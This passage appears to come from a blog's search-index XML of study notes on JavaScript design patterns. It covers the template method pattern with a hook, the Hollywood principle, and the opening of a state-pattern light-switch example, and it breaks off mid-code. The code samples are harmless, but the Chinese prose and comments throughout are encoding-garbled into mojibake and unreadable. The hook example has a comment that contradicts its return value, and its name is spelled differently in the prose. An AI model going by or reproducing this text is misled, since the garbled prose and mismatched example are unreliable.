æŠŠæ•°æ®æ¸²æŸ“åˆ° div å®¹å™¨é‡Œé¢ï¼Œå®Œæˆç»„ä»¶çš„æž„é€  é€šçŸ¥ç”¨æˆ·ç»„ä»¶æ¸²æŸ“å®Œæ¯• æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä»»ä½•ç»„ä»¶çš„æž„å»ºéƒ½éµå¾ªä¸Šé¢çš„å››éƒ¨ï¼Œå…¶ä¸­ç¬¬ä¸€æ­¥å’Œæœ€åŽä¸€æ­¥æ˜¯ç›¸åŒçš„ï¼Œç¬¬äºŒæ­¥ä¸åŒçš„åœ°æ–¹æ˜¯è¯·æ±‚ ajax çš„è¿œç¨‹åœ°å€ï¼Œç¬¬ä¸‰æ­¥ä¸åŒåœ°æ–¹æ˜¯æ¸²æŸ“æ•°æ®çš„æ–¹å¼ã€‚ é’©å­æ–¹æ³•é€šè¿‡æ¨¡æ¿æ–¹æ³•æ¨¡å¼ï¼Œæˆ‘ä»¬åœ¨çˆ¶ç±»ä¸­å°è£…äº†å­ç±»çš„ç®—æ³•æ¡†æž¶ã€‚è¿™äº›ç®—æ³•æ¡†æž¶åœ¨æ­£å¸¸çŠ¶æ€ä¸‹æ˜¯é€‚ç”¨äºŽå¤šæ•°å­ç±»çš„ï¼Œä½†å¦‚æžœæœ‰ä¸€äº›ç‰¹åˆ«â€œä¸ªæ€§â€çš„å­ç±»å‘¢ï¼Ÿæ¯”å¦‚æˆ‘ä»¬åœ¨ é¥®æ–™ç±» Beverage ä¸­å°è£…äº†é¥®æ–™å†²æ³¡é¡ºåºï¼š æŠŠæ°´ç…®æ²¸ ç”¨æ²¸æ°´å†²æ³¡é¥®æ–™ æŠŠé¥®æ–™å€’å…¥æ¯ä¸­ åŠ è°ƒæ–™ åœ¨æˆ‘ä»¬çš„é¥®æ–™åº—ä¸­ï¼Œæ ¹æ®è¿™å››ä¸ªæ­¥éª¤åˆ¶ä½œå‡ºæ¥çš„å’–å•¡å’ŒèŒ¶ï¼Œä¸€ç›´é¡ºåˆ©åœ°æä¾›ç»™ç»å¤§å¤šæ•°å®¢äººäº«ç”¨ã€‚ä½†æœ‰ä¸€äº›å®¢äººå–å’–å•¡æ˜¯ä¸åŠ è°ƒæ–™çš„ã€‚æ—¢ç„¶ Beverage ä½œä¸ºçˆ¶ç±»ï¼Œå·²ç»è§„å®šå¥½äº†å†²æ³¡é¥®æ–™çš„å››ä¸ªæ­¥éª¤ï¼Œé‚£ä¹ˆæœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥è®©å­ç±»ä¸å—è¿™ä¸ªçº¦æŸï¼Ÿ é’©å­æ–¹æ³•ï¼ˆhookï¼‰ å¯ä»¥ç”¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæ”¾ç½®é’©å­æ˜¯éš”ç¦»å˜åŒ–çš„ä¸€ç§å¸¸è§çš„æ‰‹æ®µï¼Œæˆ‘ä»¬åœ¨çˆ¶ç±»ä¸­å®¹æ˜“å˜åŒ–çš„åœ°æ–¹æ”¾ç½®é’©å­ï¼Œé’©å­å¯ä»¥æœ‰ä¸€ä¸ªé»˜è®¤çš„å®žçŽ°ï¼Œç©¶ç«Ÿè¦ä¸è¦ â€œæŒ‚é’©â€ï¼Œè¿™ç”±å­ç±»è‡ªè¡Œå†³å®šã€‚é’©å­æ–¹æ³•çš„è¿”å›žç»“æžœå†³å®šäº†æ¨¡æ¿æ–¹æ³•åŽé¢éƒ¨åˆ†çš„æ‰§è¡Œæ­¥éª¤ï¼Œä¹Ÿå°±æ˜¯ç¨‹åºæŽ¥ä¸‹æ¥çš„èµ°å‘ï¼Œè¿™æ ·ä¸€æ¥ï¼Œç¨‹åºå°±æ‹¥æœ‰äº†å˜åŒ–çš„å¯èƒ½ã€‚ åœ¨è¿™ä¸ªä¾‹å­é‡Œé¢ï¼Œæˆ‘ä»¬æŠŠæŒ‚é’©çš„åä¸ºå®šä½ customWantsCondimentsï¼ŒæŽ¥ä¸‹æ¥å°†æŒ‚é’©æ”¾å…¥ Beverage ç±»ï¼Œçœ‹çœ‹æˆ‘ä»¬å¦‚ä½•å¾—åˆ°ä¸€æ¯ä¸éœ€è¦ ç³–å’Œç‰›å¥¶çš„å’–å•¡ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142var Beverage = function()&#123;&#125;Beverage.prototype.boilWater = function()&#123; console.log('æŠŠæ°´ç…®æ²¸');&#125; Beverage.prototype.brew = function()&#123; throw new Error('å­ç±»å¿…é¡»é‡å†™ brew æ–¹æ³•');&#125; Beverage.prototype.pourInCup = function()&#123; throw new Error('å­ç±»å¿…é¡»é‡å†™ pourInCup æ–¹æ³•');&#125; Beverage.prototype.addCondiments = function()&#123; throw new Error('å­ç±»å¿…é¡»é‡å†™ addCondiments æ–¹æ³•');&#125;Beverage.prototype.customerWantsCondiments = function()&#123; return false; // é»˜è®¤éœ€è¦è°ƒæ–™&#125; Beverage.prototype.init = function()&#123; this.boilWater() this.brew() this.pourInCup() if(this.customerWantsCondiments())&#123; this.addCondiments() &#125; &#125; var CoffeeWithHook = function()&#123;&#125;CoffeeWithHook.prototype = new Beverage();CoffeeWithHook.prototype.brew = function()&#123; console.log('ç”¨æ²¸æ°´å†²æ³¡å’–å•¡');&#125;CoffeeWithHook.prototype.pourInCup = function()&#123; console.log('æŠŠå’–å•¡å€’è¿›æ¯å­');&#125;CoffeeWithHook.prototype.addCondiments = function()&#123; console.log('åŠ ç³–å’Œç‰›å¥¶');&#125;CoffeeWithHook.prototype.customerWantsCondiments = function()&#123; return window.confirm('è¯·é—®éœ€è¦è°ƒæ–™å—ï¼Ÿ');&#125; var coffeeWithHook = new CoffeeWithHook();coffeeWithHook.init(); å¥½èŽ±åžåŽŸåˆ™å¥½èŽ±åžæ— ç–‘æ˜¯æ¼”å‘˜çš„å¤©å ‚ï¼Œä½†å¥½èŽ±åžä¹Ÿæœ‰å¾ˆå¤šæ‰¾ä¸åˆ°å·¥ä½œçš„æ–°äººæ¼”å‘˜ï¼Œè®¸å¤šæ–°äººæ¼”å‘˜åœ¨å¥½èŽ±åžæŠŠç®€åŽ†é€’ç»™æ¼”è‰ºå…¬å¸ä¹‹åŽå°±åªæœ‰å›žå®¶ç­‰å¾…ç”µè¯ã€‚æœ‰æ—¶å€™è¯¥æ¼”å‘˜ç­‰å¾—ä¸è€çƒ¦äº†ï¼Œç»™æ¼”è‰ºå…¬å¸æ‰“ç”µè¯è¯¢é—®æƒ…å†µï¼Œæ¼”è‰ºå…¬å¸å¾€å¾€è¿™æ ·å›žç­”ï¼šâ€œä¸è¦æ¥æ‰¾æˆ‘ï¼Œæˆ‘ä¼šç»™ä½ æ‰“ç”µè¯ã€‚â€ åœ¨è®¾è®¡ä¸­ï¼Œè¿™æ ·çš„è§„åˆ™å°±æ˜¯å¥½èŽ±åžåŽŸåˆ™ã€‚åœ¨è¿™ä¸€åŽŸåˆ™çš„æŒ‡å¯¼ä¸‹ï¼Œæˆ‘ä»¬è¿è¡Œåº•å±‚ç»„ä»¶å°†è‡ªå·±æŒ‚é’©åˆ°é«˜å±‚ç»„ä»¶ä¸­ï¼Œè€Œé«˜å±‚ç»„ä»¶å†³å®šä»€ä¹ˆæ—¶å€™ã€ä»¥ä½•ç§æ–¹å¼åŽ»ä½¿ç”¨è¿™äº›åº•å±‚ç»„ä»¶ï¼Œé«˜å±‚ç»„ä»¶å¯¹å¾…åº•å±‚ç»„ä»¶çš„æ–¹å¼ï¼Œè·Ÿæ¼”è‰ºå…¬å¸å¯¹å¾…æ–°äººæ¼”å‘˜ä¸€æ ·ï¼Œéƒ½æ˜¯ â€œåˆ«è°ƒç”¨æˆ‘ä»¬ï¼Œæˆ‘ä»¬ä¼šè°ƒç”¨ä½ â€ã€‚ æ¨¡æ¿æ–¹æ³•æ¨¡å¼æ˜¯å¥½èŽ±åžåŽŸåˆ™çš„ä¸€ä¸ªå…¸åž‹ä½¿ç”¨åœºæ™¯ï¼Œå®ƒä¸Žå¥½èŽ±åžåŽŸåˆ™çš„è”ç³»éžå¸¸æ˜Žæ˜¾ï¼Œå½“æˆ‘ä»¬ç”¨æ¨¡æ¿æ–¹æ³•æ¨¡å¼ç¼–å†™ä¸€ä¸ªç¨‹åºçš„æ—¶å€™ï¼Œè¿™æ„å‘³ç€å­ç±»æ”¾å¼ƒäº†å¯¹è‡ªå·±çš„æŽ§åˆ¶æƒï¼Œè€Œæ˜¯æ”¹æˆçˆ¶ç±»é€šçŸ¥å­ç±»ï¼Œå“ªäº›æ–¹æ³•åº”è¯¥åœ¨ä»€ä¹ˆæ—¶å€™è¢«è°ƒç”¨ï¼Œä½œä¸ºå­ç±»ï¼Œåªè´Ÿè´£æä¾›ä¸€äº›è®¾è®¡ä¸Šçš„ç»†èŠ‚ã€‚ é™¤æ­¤ä¹‹å¤–ï¼Œå¥½èŽ±åžåŽŸåˆ™è¿˜å¸¸å¸¸åº”ç”¨äºŽå…¶ä»–æ¨¡å¼å’Œåœºæ™¯ï¼Œä¾‹å¦‚å‘å¸ƒ-è®¢é˜…æ¨¡å¼å’Œå›žè°ƒå‡½æ•°ã€‚ å‘å¸ƒ-è®¢é˜…æ¨¡å¼ å‘å¸ƒè€…ä¼šæŠŠæ¶ˆæ¯æŽ¨é€ç»™è®¢é˜…è€…ï¼Œè¿™å–ä»£äº†åŽŸå…ˆä¸æ–­åŽ» fetch æ¶ˆæ¯çš„å½¢å¼ã€‚ä¾‹å¦‚å‡è®¾æˆ‘ä»¬ä¹˜åå‡ºç§Ÿè½¦åŽ»ä¸€ä¸ªä¸äº†è§£çš„åœ°æ–¹ï¼Œé™¤äº†æ¯è¿‡ 5 ç§’é’Ÿé—®å¸æœº â€œæ˜¯å¦è¾¾åˆ°äº†ç›®çš„åœ°â€ä¹‹å¤–ï¼Œè¿˜å¯ä»¥åœ¨è½¦ä¸Šç¾Žç¾Žåœ°ç¡ä¸€è§‰ï¼Œç„¶åŽè·Ÿå¸æœºè¯´å¥½ï¼Œç­‰ç›®çš„åœ°åˆ°äº†å°±å«é†’ä½ ã€‚è¿™ä¹Ÿç›¸å½“äºŽå¥½èŽ±åžåŽŸåˆ™ä¸­çš„ â€œåˆ«è°ƒç”¨æˆ‘ä»¬ï¼Œæˆ‘ä»¬ä¼šè°ƒç”¨ä½ â€ å›žè°ƒå‡½æ•° åœ¨ ajax å¼‚æ­¥è¯·æ±‚ä¸­ï¼Œç”±äºŽä¸çŸ¥é“è¯·æ±‚è¿”å›žçš„å…·ä½“æ—¶é—´ï¼Œè€Œé€šè¿‡è½®è¯¢åŽ»åˆ¤æ–­æ˜¯å¦è¿”å›žæ•°æ®ï¼Œè¿™é¡¹æ˜¾ç„¶æ˜¯ä¸ç†æ™ºçš„è¡Œä¸ºã€‚æ‰€ä»¥æˆ‘ä»¬é€šå¸¸ä¼šæŠŠæŽ¥ä¸‹æ¥çš„æ“ä½œæ”¾åœ¨å›žè°ƒå‡½æ•°ä¸­ï¼Œä¼ å…¥å‘èµ· ajax å¼‚æ­¥è¯·æ±‚çš„å‡½æ•°ã€‚å½“æ•°æ®è¿”å›žä¹‹åŽï¼Œè¿™ä¸ªå›žè°ƒå‡½æ•°æ‰è¢«æ‰§è¡Œï¼Œè¿™ä¹Ÿæ˜¯å¥½èŽ±åžåŽŸåˆ™çš„ä¸€ç§ä½“çŽ°ã€‚æŠŠéœ€è¦æ‰§è¡Œçš„æ“ä½œå°è£…åœ¨å›žè°ƒå‡½æ•°é‡Œé¢ï¼Œç„¶åŽæŠŠä¸»åŠ¨æƒäº¤ç»™å¦ä¸€ä¸ªå‡½æ•°ã€‚è‡³äºŽå›žè°ƒå‡½æ•°ä»€ä¹ˆæ—¶å€™è¢«è°ƒç”¨ï¼Œåˆ™æ˜¯å¦å¤–ä¸€ä¸ªå‡½æ•°æŽ§åˆ¶çš„ã€‚ çœŸçš„éœ€è¦ â€œç»§æ‰¿â€ å—æ¨¡æ¿æ–¹æ³•æ¨¡å¼æ˜¯åŸºäºŽç»§æ‰¿çš„ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œçˆ¶ç±»å°è£…äº†å­ç±»çš„ç®—æ³•æ¡†æž¶å’Œæ–¹æ³•çš„æ‰§è¡Œé¡ºåºï¼Œå­ç±»ç»§æ‰¿çˆ¶ç±»ä¹‹åŽï¼Œçˆ¶ç±»é€šçŸ¥å­ç±»æ‰§è¡Œè¿™äº›æ–¹æ³•ï¼Œå¥½èŽ±åžåŽŸåˆ™å¾ˆå¥½åœ°è¯ é‡Šäº†è¿™ç§è®¾è®¡æŠ€å·§ï¼Œå³é«˜å±‚ç»„ä»¶è°ƒç”¨åº•å±‚ç»„ä»¶ã€‚ ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ç¼–å†™äº†ä¸€ä¸ª Coffee or Tea çš„ä¾‹å­ã€‚æ¨¡æ¿æ–¹æ³•æ¨¡å¼æ˜¯ä¸ºæ•°ä¸å¤šçš„åŸºäºŽç»§æ‰¿çš„è®¾è®¡æ¨¡å¼ï¼Œä½† JavaScript è¯­è¨€å®žé™…ä¸Šæ²¡æœ‰æä¾›çœŸæ­£çš„ç±»å¼ç»§æ‰¿æ¨¡å¼ï¼Œç»§æ‰¿æ˜¯é€šè¿‡å¯¹è±¡ä¸Žå¯¹è±¡ä¹‹é—´çš„å§”æ‰˜æ¥å®žçŽ°çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè™½ç„¶æˆ‘ä»¬åœ¨å½¢å¼ä¸Šå€Ÿé‰´äº†æä¾›ç±»å¼ç»§æ‰¿çš„è¯­è¨€ï¼Œä½†æœ¬ç« å­¦ä¹ åˆ°çš„æ¨¡æ¿æ–¹æ³•æ¨¡å¼å¹¶ä¸ååˆ†æ­£å®—ã€‚ åœ¨å¥½èŽ±åžåŽŸåˆ™çš„æŒ‡å¯¼ä¸‹ï¼Œä¸‹é¢çš„è¿™æ®µä»£ç å¯ä»¥è¾¾åˆ°å’Œç»§æ‰¿ä¸€æ ·çš„æ•ˆæžœã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152var Beverage = function(param)&#123; var boilWater = function()&#123; console.log('æŠŠæ°´ç…®æ²¸'); &#125;; var brew = param.brew || function()&#123; throw new Error('å¿…é¡»ä¼ é€’ brew æ–¹æ³•'); &#125;; var pourInCup = param.pourInCup || function()&#123; throw new Error('å¿…é¡»ä¼ é€’ pourInCup æ–¹æ³•'); &#125;; var addCondiments = param.addCondiments || function()&#123; throw new Error('å¿…é¡»ä¼ é€’ addCondiments æ–¹æ³•'); &#125;; var F = function()&#123;&#125;; F.prototype.init = function()&#123; boilWater(); brew(); pourInCup(); addCondiments(); &#125; return F;&#125;var Coffee = Beverage(&#123; brew:function()&#123; console.log('ç”¨æ²¸æ°´å†²æ³¡å’–å•¡'); &#125;, pourInCup:function()&#123; console.log('æŠŠå’–å•¡å€’è¿›æ¯å­'); &#125;, addCondiments:function()&#123; console.log('åŠ ç³–å’Œç‰›å¥¶'); &#125; &#125;);var Tea = Beverage(&#123; brew: function()&#123; console.log( 'ç”¨æ²¸æ°´æµ¸æ³¡èŒ¶å¶' ); &#125;, pourInCup: function()&#123; console.log( 'æŠŠèŒ¶å€’è¿›æ¯å­' ); &#125;, addCondiments: function()&#123; console.log( 'åŠ æŸ æª¬' ); &#125; &#125;); var coffee = new Coffee();coffee.init();var tea = new Tea();tea.init(); åœ¨è¿™æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬æŠŠ brewã€pourInCupã€addCondiments è¿™äº›æ–¹æ³•ä¾æ¬¡ä¼ å…¥ Beverage å‡½æ•°ï¼ŒBeverage å‡½æ•°è¢«è°ƒç”¨ä¹‹åŽè¿”å›žæž„é€ å™¨ Fã€‚F ç±»ä¸­åŒ…å«äº†â€œæ¨¡æ¿æ–¹æ³•â€F.prototype.initã€‚è·Ÿç»§æ‰¿å¾—åˆ°çš„æ•ˆæžœä¸€æ ·ï¼Œè¯¥â€œæ¨¡æ¿æ–¹æ³•â€é‡Œä¾ç„¶å°è£…äº†é¥®æ–™å­ç±»çš„ç®—æ³•æ¡†æž¶ å°ç»“æ¨¡æ¿æ–¹æ³•æ¨¡å¼æ˜¯ä¸€ç§å…¸åž‹çš„é€šè¿‡å°è£…å˜åŒ–æé«˜ç³»ç»Ÿæ‰©å±•æ€§çš„è®¾è®¡æ¨¡å¼ã€‚åœ¨ä¼ ç»Ÿçš„é¢å‘å¯¹è±¡è¯­è¨€ä¸­ï¼Œä¸€ä¸ªè¿ç”¨æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„ç¨‹åºä¸­ï¼Œå­ç±»çš„æ–¹æ³•ç§ç±»å’Œæ‰§è¡Œé¡ºåºéƒ½æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠè¿™éƒ¨åˆ†é€»è¾‘æŠ½è±¡åˆ°çˆ¶ç±»çš„æ¨¡æ¿æ–¹æ³•é‡Œé¢ã€‚è€Œå­ç±»çš„æ–¹æ³•å…·ä½“æ€Žä¹ˆå®žçŽ°åˆ™æ˜¯å¯å˜çš„ï¼ŒäºŽæ˜¯æˆ‘ä»¬æŠŠè¿™éƒ¨åˆ†å˜åŒ–çš„é€»è¾‘å°è£…åˆ°å­ç±»ä¸­ã€‚é€šè¿‡å¢žåŠ æ–°çš„å­ç±»ï¼Œæˆ‘ä»¬ä¾¿èƒ½å¯¹ç³»ç»Ÿå¢žåŠ æ–°çš„åŠŸèƒ½ï¼Œå¹¶ä¸éœ€è¦æ”¹åŠ¨æŠ½è±¡å·²ç»å…¶ä»–å­ç±»ï¼Œè¿™ä¹Ÿæ˜¯ç¬¦åˆå¼€å‘-å°é—­çš„åŽŸåˆ™ã€‚ ä½†åœ¨ JavaScript ä¸­ï¼Œæˆ‘ä»¬å¾ˆå¤šæ—¶å€™å¹¶ä¸éœ€è¦è¿™æ ·åŽ»å®žçŽ°ä¸€ä¸ªæ¨¡æ¿æ–¹æ³•æ¨¡å¼ï¼Œé«˜é˜¶å‡½æ•°æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚]]></content>
      <categories>
        <category>JavaScriptè®¾è®¡æ¨¡å¼</category>
      </categories>
      <tags>
        <tag>JavaScriptè®¾è®¡æ¨¡å¼</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”çŠ¶æ€æ¨¡å¼]]></title>
    <url>%2F2019-03-15-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”çŠ¶æ€æ¨¡å¼æ€æ¨¡å¼æ˜¯ä¸€ç§éžåŒå¯»å¸¸çš„ä¼˜ç§€æ¨¡å¼ï¼Œå®ƒä¹Ÿè®¸æ˜¯è§£å†³æŸäº›éœ€æ±‚åœºæ™¯çš„æœ€å¥½æ–¹æ³•ã€‚è™½ç„¶çŠ¶æ€æ¨¡å¼å¹¶ä¸æ˜¯ä¸€ç§ç®€å•åˆ°ä¸€ç›®äº†ç„¶çš„æ¨¡å¼ï¼ˆå®ƒå¾€å¾€è¿˜ä¼šå¸¦æ¥ä»£ç é‡çš„å¢žåŠ ï¼‰ï¼Œä½†ä½ ä¸€æ—¦æ˜Žç™½äº†çŠ¶æ€æ¨¡å¼çš„ç²¾é«“ï¼Œä»¥åŽä¸€å®šä¼šæ„Ÿè°¢å®ƒå¸¦ç»™ä½ çš„æ— ä¸Žä¼¦æ¯”çš„å¥½å¤„ã€‚ çŠ¶æ€æ¨¡å¼çš„å…³é”®æ˜¯åŒºåˆ†äº‹ç‰©å†…éƒ¨çš„çŠ¶æ€ï¼Œäº‹ç‰©å†…éƒ¨çŠ¶æ€çš„æ”¹å˜å¾€å¾€ä¼šå¸¦æ¥äº‹ç‰©çš„è¡Œä¸ºæ”¹å˜ã€‚ åˆè¯†åœºæ™¯ï¼šæœ‰ä¸€ä¸ªç”µç¯ï¼Œç”µç¯ä¸Šé¢åªæœ‰ä¸€ä¸ªå¼€å…³ã€‚å½“ç”µç¯å¼€ç€çš„æ—¶å€™ï¼Œæ­¤æ—¶æŒ‰ä¸‹å¼€å…³ï¼Œç”µç¯ä¼šåˆ‡æ¢åˆ°å…³é—­çŠ¶æ€ï¼›å†æŒ‰ä¸€æ¬¡å¼€å…³ï¼Œç”µç¯åˆå°†è¢«æ‰“å¼€ã€‚åŒä¸€ä¸ªå¼€å…³æŒ‰é’®ï¼Œåœ¨ä¸åŒçš„çŠ¶æ€ä¸‹ï¼Œè¡¨çŽ°å‡ºæ¥çš„è¡Œä¸ºæ˜¯ä¸ä¸€æ ·çš„ã€‚ é¦–å…ˆå®šä¹‰ä¸€ä¸ª Light ç±»ï¼Œå¯ä»¥é¢„è§ï¼Œç”µç¯å¯¹è±¡ light å°†ä»Ž Lightç±»åˆ›å»ºè€Œå‡ºï¼Œ light å¯¹è±¡å°†æ‹¥æœ‰ä¸¤ä¸ªå±žæ€§ï¼Œæˆ‘ä»¬ç”¨ state æ¥è®°å½•ç”µç¯å½“å‰çš„çŠ¶æ€ï¼Œç”¨ button è¡¨ç¤ºå…·ä½“çš„å¼€å…³æŒ‰é’®ã€‚ä¸‹é¢æ¥ç¼–å†™è¿™ä¸ªç”µç¯ç¨‹åºçš„ä¾‹å­ã€‚ ä¾‹å­ï¼šç”µç¯ç¨‹åº1234567891011121314151617181920212223242526const Light = function()&#123; this.state = 'off'; // ç»™ç”µç¯è®¾ç½®åˆå§‹çŠ¶æ€ off this.button = null; // ç”µç¯å¼€å…³æŒ‰é’®&#125;// è¯¥æ–¹æ³•è´Ÿè´£åœ¨é¡µé¢ä¸­åˆ›å»ºä¸€ä¸ªçœŸå®žçš„ button èŠ‚ç‚¹ï¼Œè¿™ä¸ª button å°±æ˜¯ç”µç¯çš„å¼€å…³æŒ‰é’®Light.prototype.init = function()&#123; const button = document.createElement('button'), self = this; button.innerHTML = 'å¼€å…³'; this.button = document.body.appendChild(button); this.button.onclick = function()&#123; self.buttonWasPressed(); &#125;&#125;Light.prototype.buttonWasPressed = function()&#123; if(this.state === 'off')&#123; console.log('å¼€ç¯'); this.state = 'on'; &#125;else if(this.state === 'on')&#123; console.log('å…³ç¯'); this.state = 'off'; &#125;&#125;const light = new Light();light.init(); æ–°åž‹ç”µç¯ï¼š 123456789101112Light.prototype.buttonWasPressed = function()&#123; if ( this.state === 'off' )&#123; console.log( 'å¼±å…‰' ); this.state = 'weakLight'; &#125;else if ( this.state === 'weakLight' )&#123; console.log( 'å¼ºå…‰' ); this.state = 'strongLight'; &#125;else if ( this.state === 'strongLight' )&#123; console.log( 'å…³ç¯' ); this.state = 'off'; &#125; &#125;; å¾ˆæ˜Žæ˜¾ buttonWasPressed æ–¹æ³•æ˜¯è¿åå¼€æ”¾ï€­å°é—­åŽŸåˆ™çš„ï¼Œæ¯æ¬¡æ–°å¢žæˆ–è€…ä¿®æ”¹ light çš„çŠ¶æ€ï¼Œéƒ½éœ€è¦æ”¹åŠ¨ buttonWasPressed æ–¹æ³•ä¸­çš„ä»£ç ï¼Œè¿™ä½¿å¾— buttonWasPressed æˆä¸ºäº†ä¸€ä¸ªéžå¸¸ä¸ç¨³å®šçš„æ–¹æ³•ã€‚ æ‰€æœ‰è·ŸçŠ¶æ€æœ‰å…³çš„è¡Œä¸ºï¼Œéƒ½è¢«å°è£…åœ¨ buttonWasPressed æ–¹æ³•é‡Œï¼Œå¦‚æžœä»¥åŽè¿™ä¸ªç”µç¯åˆå¢žåŠ äº†å¼ºå¼ºå…‰ã€è¶…å¼ºå…‰å’Œç»ˆæžå¼ºå…‰ï¼Œé‚£æˆ‘ä»¬å°†æ— æ³•é¢„è®¡è¿™ä¸ªæ–¹æ³•å°†è†¨èƒ€åˆ°ä»€ä¹ˆåœ°æ­¥ã€‚ çŠ¶æ€çš„åˆ‡æ¢éžå¸¸ä¸æ˜Žæ˜¾ï¼Œä»…ä»…è¡¨çŽ°ä¸ºå¯¹ state å˜é‡èµ‹å€¼ï¼Œæ¯”å¦‚ this.state = â€˜weakLightâ€™ã€‚åœ¨å®žé™…å¼€å‘ä¸­ï¼Œè¿™æ ·çš„æ“ä½œå¾ˆå®¹æ˜“è¢«ç¨‹åºå‘˜ä¸å°å¿ƒæ¼æŽ‰ã€‚æˆ‘ä»¬ä¹Ÿæ²¡æœ‰åŠžæ³•ä¸€ç›®äº†ç„¶åœ°æ˜Žç™½ç”µç¯ä¸€å…±æœ‰å¤šå°‘ç§çŠ¶æ€ï¼Œé™¤éžè€å¿ƒåœ°è¯»å®Œ buttonWasPressed æ–¹æ³•é‡Œçš„æ‰€æœ‰ä»£ç ã€‚ çŠ¶æ€ä¹‹é—´çš„åˆ‡æ¢å…³ç³»ï¼Œä¸è¿‡æ˜¯å¾€ buttonWasPressed æ–¹æ³•é‡Œå †ç Œ ifã€else è¯­å¥ï¼Œå¢žåŠ æˆ–è€…ä¿®æ”¹ä¸€ä¸ªçŠ¶æ€å¯èƒ½éœ€è¦æ”¹å˜è‹¥å¹²ä¸ªæ“ä½œï¼Œè¿™ä½¿ buttonWasPressed æ›´åŠ éš¾ä»¥é˜…è¯»å’Œç»´æŠ¤ã€‚ çŠ¶æ€æ¨¡å¼æ”¹è¿›æˆ‘ä»¬é€šå¸¸è°ˆåˆ°å°è£…ï¼Œä¸€èˆ¬éƒ½ä¼šä¼˜å…ˆå°è£…å¯¹è±¡çš„è¡Œä¸ºï¼Œè€Œä¸æ˜¯å¯¹è±¡çš„çŠ¶æ€ã€‚ä½†åœ¨çŠ¶æ€æ¨¡å¼ä¸­åˆšå¥½ç›¸åï¼ŒçŠ¶æ€æ¨¡å¼çš„å…³é”®æ˜¯æŠŠäº‹ç‰©çš„æ¯ç§çŠ¶æ€éƒ½å°è£…æˆå•ç‹¬çš„ç±»ï¼Œè·Ÿæ­¤çŠ¶æ€æœ‰å…³çš„è¡Œä¸ºéƒ½è¢«å°è£…åœ¨è¿™ä¸ªç±»çš„å†…éƒ¨ï¼Œæ‰€ä»¥ button è¢«æŒ‰ä¸‹çš„æ—¶å€™ï¼Œåªéœ€è¦åœ¨ä¸Šä¸‹æ–‡ä¸­ï¼ŒæŠŠè¿™ä¸ªè¯·æ±‚å§”æ‰˜ç»™å½“å‰çš„çŠ¶æ€å¯¹è±¡å³å¯ï¼Œè¯¥çŠ¶æ€å¯¹è±¡ä¼šè´Ÿè´£æ¸²æŸ“å®ƒè‡ªèº«çš„è¡Œä¸ºã€‚ åŒæ—¶æˆ‘ä»¬è¿˜å¯ä»¥æŠŠçŠ¶æ€çš„åˆ‡æ¢è§„åˆ™äº‹å…ˆåˆ†å¸ƒåœ¨çŠ¶æ€ç±»ä¸­ï¼Œ è¿™æ ·å°±æœ‰æ•ˆåœ°æ¶ˆé™¤äº†åŽŸæœ¬å­˜åœ¨çš„å¤§é‡æ¡ä»¶åˆ†æ”¯è¯­å¥ã€‚ å®šä¹‰ 3 ä¸ªçŠ¶æ€ç±»ï¼Œåˆ†åˆ«æ˜¯ offLightStateã€WeakLightStateã€strongLightStateã€‚è¿™ 3 ä¸ªç±»éƒ½æœ‰ä¸€ä¸ªåŽŸåž‹æ–¹æ³• buttonWasPressedï¼Œä»£è¡¨åœ¨å„è‡ªçŠ¶æ€ä¸‹ï¼ŒæŒ‰é’®è¢«æŒ‰ä¸‹æ—¶å°†å‘ç”Ÿçš„è¡Œä¸ºï¼Œä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243const Light = function()&#123; this.offLightState = new OffLightState(this); this.strongLightState = new StrongLightState(this); this.weakLightState = new WeakLightState(this); this.button = null;&#125;const OffLightState = function(light)&#123; this.light = light;&#125;OffLightState.prototype.buttonWasPressed = function()&#123; console.log('å¼±å…‰'); this.light.setState(this.light.weakLightState);&#125;const WeakLightState = function(light)&#123; this.light = light;&#125;WeakLightState.prototype.buttonWasPressed = function()&#123; console.log('å¼ºå…‰'); this.light.setState(this.light.strongLightState);&#125;const StrongLightState = function(light)&#123; this.light = light;&#125;StrongLightState.prototype.buttonWasPressed = function()&#123; console.log('å…³ç¯'); this.light.setState(this.light.offLightState);&#125;Light.prototype.setState = function(newState)&#123; this.currentState = newState;&#125;Light.prototype.init = function()&#123; const button = document.createElement('button'), self = this; this.button = document.body.appendChild(button); this.button.innerHTML = 'å¼€å…³'; this.currentState = this.offLightState; this.button.onclick = function()&#123; // 